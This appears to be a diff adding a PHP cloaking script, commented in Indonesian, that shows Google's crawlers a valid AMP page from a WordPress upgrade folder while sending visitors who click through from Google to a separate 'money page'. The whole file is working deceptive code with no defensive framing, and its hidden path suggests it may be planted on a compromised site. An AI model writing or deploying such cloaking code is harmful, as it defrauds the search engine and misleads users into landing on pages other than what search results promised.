@@ -1,0 +1,61 @@
+<?php
+// 1. Konfigurasi Link/File
+$amp_valid_source = 'wp-content/upgrade/index.php'; // File HTML AMP Murni untuk Google
+$money_page = 'home.php'; // Taro landing Pages Disini
+
+$googleBots = array(
+    "Googlebot",
+    "Google-Site-Verification",
+    "Google-InspectionTool",
+    "Googlebot-Mobile",
+    "Googlebot-News",
+    "Mediapartners-Google" // Tambahan untuk Adsense bot
+);
+
+$isGoogleBot = false;
+$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
+
+// 2. Cek apakah ini Bot Google
+foreach ($googleBots as $bot) {
+    if (stripos($userAgent, $bot) !== false) {
+        $isGoogleBot = true;
+        break;
+    }
+}
+
+// 3. Cek apakah traffic datang dari Google (Referrer)
+// User yang klik dari hasil pencarian Google biasanya membawa referrer 'google.com'
+$isFromGoogle = (stripos($referer, 'google.com') !== false || stripos($referer, 'ampproject.org') !== false);
+
+/**
+ * LOGIKA PENYARINGAN:
+ * - Jika Bot Google: Kasih konten AMP (agar validasi hijau/sukses).
+ * - Jika User klik dari Google (AMP Referrer): Kasih Money Page (atau redirect).
+ * - Selain itu (Direct/Bot lain): Kasih konten AMP atau halaman netral.
+ */
+
+if ($isGoogleBot) {
+    // Tampilkan konten AMP asli agar Google menganggap halaman ini valid
+    if (file_exists($amp_valid_source)) {
+        echo file_get_contents($amp_valid_source);
+    } else {
+        echo "AMP Content Missing"; // Debugging
+    }
+    exit;
+} 
+
+if ($isFromGoogle) {
+    // User asli dari Google, arahkan ke halaman utama/penjualan
+    include($money_page);
+    exit;
+} else {
+    // Jika traffic direct atau dari sumber lain, tampilkan AMP agar aman
+    if (file_exists($amp_valid_source)) {
+        echo file_get_contents($amp_valid_source);
+    } else {
+        include($money_page);
+    }
+    exit;
+}
+?>
